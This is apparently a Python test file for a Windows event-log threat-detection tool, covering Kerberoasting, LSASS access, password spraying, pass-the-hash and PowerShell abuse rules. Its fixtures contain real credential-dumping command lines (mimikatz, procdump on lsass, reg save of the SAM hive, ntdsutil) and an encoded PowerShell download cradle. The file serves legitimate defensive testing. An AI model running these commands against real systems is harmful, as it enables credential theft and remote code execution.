from datetime import timedelta

from conftest import make

from evtx_triage.detections import Config, build_rules
from evtx_triage.detections.credential_access import (
    AsRepRoasting,
    CredentialDumpCommand,
    Kerberoasting,
    LsassAccess,
    PasswordSpray,
)
from evtx_triage.detections.execution import LogCleared, PowerShellAbuse, decode_encoded_command
from evtx_triage.detections.lateral_movement import AdminShareAccess, LogonFanOut, PassTheHash, RemoteServiceInstall
from evtx_triage.engine import Engine
from evtx_triage.models import Severity


def run(rule, events):
    return Engine([rule], rule.config, correlate=False).run(events).findings


def tgs(sec, svc, etype="0x17", user="alice@CORP.EXAMPLE", status="0x0"):
    return make(4769, sec, "DC01", TargetUserName=user, ServiceName=svc, TicketEncryptionType=etype,
                Status=status, IpAddress="::ffff:192.0.2.9")


# --- Kerberoasting ---------------------------------------------------------------
def test_kerberoast_burst_is_high():
    (f,) = run(Kerberoasting(), [tgs(0, "svc_a"), tgs(1, "svc_b"), tgs(2, "svc_c")])
    assert f.severity == Severity.HIGH
    assert f.details["services"] == ["svc_a", "svc_b", "svc_c"]
    assert f.source_ip == "192.0.2.9"
    assert len(f.evidence) == 3


def test_kerberoast_single_request_is_medium():
    (f,) = run(Kerberoasting(), [tgs(0, "svc_a")])
    assert f.severity == Severity.MEDIUM


def test_kerberoast_ignores_aes_machine_accounts_krbtgt_and_failures():
    events = [tgs(0, "svc_a", etype="0x12"), tgs(1, "FS01$"), tgs(2, "krbtgt"),
              tgs(3, "svc_b", status="0x1b"), tgs(4, "svc_c", user="WS01$@CORP.EXAMPLE")]
    assert run(Kerberoasting(), events) == []


def test_kerberoast_bursts_split_by_window():
    cfg = Config(window=timedelta(minutes=1))
    events = [tgs(0, "svc_a"), tgs(1, "svc_b"), tgs(2, "svc_c"), tgs(600, "svc_d")]
    sev = sorted(f.severity for f in run(Kerberoasting(cfg), events))
    assert sev == [Severity.MEDIUM, Severity.HIGH]


def test_asrep_roast():
    hit = make(4768, 0, "DC01", TargetUserName="legacy", PreAuthType="0", TicketEncryptionType="0x17",
               Status="0x0", IpAddress="::ffff:192.0.2.9")
    normal = make(4768, 1, "DC01", TargetUserName="bob", PreAuthType="2", TicketEncryptionType="0x12",
                  Status="0x0")
    (f,) = run(AsRepRoasting(), [hit, normal])
    assert f.source_ip == "192.0.2.9" and "legacy" in f.user


# --- LSASS / credential dumping ----------------------------------------------------------
def lsass(source, mask, trace="ntdll.dll+1"):
    return make(10, 0, TargetImage="C:\\Windows\\system32\\lsass.exe", SourceImage=source,
                GrantedAccess=mask, CallTrace=trace, SourceUser="CORP\\alice")


def test_lsass_access():
    (f,) = run(LsassAccess(), [lsass("C:\\Temp\\m.exe", "0x1010")])
    assert f.severity == Severity.HIGH
    (f,) = run(LsassAccess(), [lsass("C:\\Temp\\m.exe", "0x1410", "x|dbgcore.DLL+6dd6")])
    assert f.severity == Severity.CRITICAL


def test_lsass_access_allowlist_and_harmless_mask():
    assert run(LsassAccess(), [lsass("C:\\ProgramData\\Defender\\MsMpEng.exe", "0x1010")]) == []
    assert run(LsassAccess(), [lsass("C:\\Temp\\m.exe", "0x1000")]) == []  # QUERY_LIMITED_INFORMATION only


def test_credential_dump_command_lines():
    cmds = ["rundll32.exe C:\\windows\\System32\\comsvcs.dll, MiniDump 624 C:\\temp\\x.dmp full",
            "procdump64.exe -accepteula -ma lsass.exe out.dmp",
            "reg save HKLM\\SAM C:\\temp\\sam",
            "mimikatz.exe privilege::debug sekurlsa::logonpasswords exit",
            'ntdsutil "ac i ntds" "ifm" "create full c:\\temp" q q']
    events = [make(1, i, CommandLine=c, User="CORP\\alice") for i, c in enumerate(cmds)]
    findings = run(CredentialDumpCommand(), events)
    assert len(findings) == len(cmds)
    assert run(CredentialDumpCommand(), [make(1, 0, CommandLine="notepad.exe lsass-notes.txt")]) == []


# --- Spray / brute force --------------------------------------------------------------------
def fail(sec, user, ip="198.51.100.7"):
    return make(4625, sec, "DC01", TargetUserName=user, IpAddress=ip, Status="0xc000006d")


def test_password_spray_then_success_is_critical():
    events = [fail(i, f"user{i}") for i in range(6)]
    events.append(make(4624, 30, "DC01", TargetUserName="user3", LogonType="3", IpAddress="198.51.100.7"))
    (f,) = run(PasswordSpray(), events)
    assert f.severity == Severity.CRITICAL
    assert f.details["compromised_accounts"] == ["user3"]


def test_password_spray_without_success_is_high():
    (f,) = run(PasswordSpray(), [fail(i, f"user{i}") for i in range(5)])
    assert f.severity == Severity.HIGH and f.details["pattern"] == "spray"


def test_brute_force_single_account():
    (f,) = run(PasswordSpray(), [fail(i, "bob") for i in range(10)])
    assert f.severity == Severity.MEDIUM and f.details["pattern"] == "brute force"


def test_a_few_typos_are_quiet():
    assert run(PasswordSpray(), [fail(0, "bob"), fail(5, "bob"), fail(9, "carol")]) == []


# --- Lateral movement ------------------------------------------------------------------------
def net_logon(sec, host, user="adm.jsmith", key_length="0", package="NTLM", ip="192.0.2.101"):
    return make(4624, sec, host, TargetUserName=user, TargetDomainName="CORP", LogonType="3",
                LogonProcessName="NtLmSsp ", AuthenticationPackageName=package, KeyLength=key_length,
                IpAddress=ip)


def test_pass_the_hash_target_side():
    (f,) = run(PassTheHash(), [net_logon(0, "FS01")])
    assert f.severity == Severity.MEDIUM and f.user == "CORP\\adm.jsmith"
    assert run(PassTheHash(), [net_logon(0, "FS01", key_length="128")]) == []
    assert run(PassTheHash(), [net_logon(0, "FS01", user="ANONYMOUS LOGON")]) == []
    assert run(PassTheHash(), [net_logon(0, "FS01", user="WS01$")]) == []


def test_pass_the_hash_source_side():
    e = make(4624, 0, "WS01", SubjectUserName="alice", SubjectDomainName="CORP", TargetUserName="alice",
             LogonType="9", LogonProcessName="seclogo", AuthenticationPackageName="Negotiate",
             TargetOutboundUserName="adm.jsmith", TargetOutboundDomainName="CORP")
    (f,) = run(PassTheHash(), [e])
    assert f.severity == Severity.HIGH and "adm.jsmith" in f.summary


def test_logon_fanout():
    events = [net_logon(i * 60, h, package="Kerberos", key_length="0") for i, h in enumerate(["FS01", "SQL01", "DC01"])]
    (f,) = run(LogonFanOut(), events)
    assert f.details["targets"] == ["DC01", "FS01", "SQL01"]
    assert run(LogonFanOut(), events[:2]) == []
    assert run(LogonFanOut(Config(fanout_min_hosts=2)), events[:2]) != []


def test_remote_service_install():
    psexec = make(7045, 0, "FS01", ServiceName="PSEXESVC", ImagePath="%SystemRoot%\\PSEXESVC.exe")
    smbexec = make(7045, 1, "DC01", ServiceName="abcd",
                   ImagePath="%COMSPEC% /Q /c echo whoami ^> \\\\127.0.0.1\\ADMIN$\\__out")
    benign = make(7045, 2, "WS01", ServiceName="Updater", ImagePath='"C:\\Program Files\\Vendor\\upd.exe" /svc')
    findings = run(RemoteServiceInstall(), [psexec, smbexec, benign])
    assert [f.severity for f in findings] == [Severity.HIGH, Severity.CRITICAL]


def test_admin_share_dedup():
    e = make(5145, 0, "FS01", SubjectUserName="adm.jsmith", SubjectDomainName="CORP", ShareName="\\\\*\\ADMIN$",
             RelativeTargetName="PSEXESVC.exe", IpAddress="192.0.2.101")
    assert len(run(AdminShareAccess(), [e, e])) == 1


# --- PowerShell / defence evasion --------------------------------------------------------------
def test_powershell_encoded_command_is_decoded_and_scored():
    import base64
    payload = base64.b64encode("IEX (New-Object Net.WebClient).DownloadString('http://x/a')".encode("utf-16-le"))
    e = make(1, 0, Image="C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
             CommandLine=f"powershell -nop -w hidden -enc {payload.decode()}", User="CORP\\alice")
    (f,) = run(PowerShellAbuse(), [e])
    assert f.severity == Severity.CRITICAL
    assert "DownloadString" in f.details["decoded_command"]
    assert "download cradle (decoded)" in f.details["indicators"]


def test_powershell_benign_and_non_powershell_processes():
    benign = make(4104, 0, ScriptBlockText="Get-Service | Where-Object Status -eq Running")
    other = make(1, 1, Image="C:\\Windows\\System32\\cmd.exe", CommandLine="cmd /c IEX DownloadString")
    assert run(PowerShellAbuse(), [benign, other]) == []


def test_decode_encoded_command_handles_garbage():
    assert decode_encoded_command("powershell -enc !!!notbase64!!!") is None
    assert decode_encoded_command("powershell -File x.ps1") is None


def test_log_cleared():
    e = make(1102, 0, "DC01", SubjectUserName="adm.jsmith", SubjectDomainName="CORP")
    (f,) = run(LogCleared(), [e])
    assert f.user == "CORP\\adm.jsmith"


# --- Registry / correlation ------------------------------------------------------------------------
def test_rule_selection():
    ids = [r.id for r in build_rules(select=["LM-"])]
    assert ids and all(i.startswith("LM-") for i in ids)
    assert "DE-LOG-CLEARED" not in [r.id for r in build_rules(exclude=["DE-"])]


def test_chain_requires_two_tactics_for_same_user():
    events = [tgs(0, "svc_a"), tgs(1, "svc_b"), tgs(2, "svc_c"),
              net_logon(60, "FS01", user="alice")]
    findings = Engine().run(events).findings
    chains = [f for f in findings if f.rule_id == "CHAIN-ATTACK-PATH"]
    assert len(chains) == 1
    assert chains[0].details["tactics"] == ["credential-access", "lateral-movement"]

    only_one_tactic = Engine().run(events[:3]).findings
    assert not [f for f in only_one_tactic if f.rule_id == "CHAIN-ATTACK-PATH"]
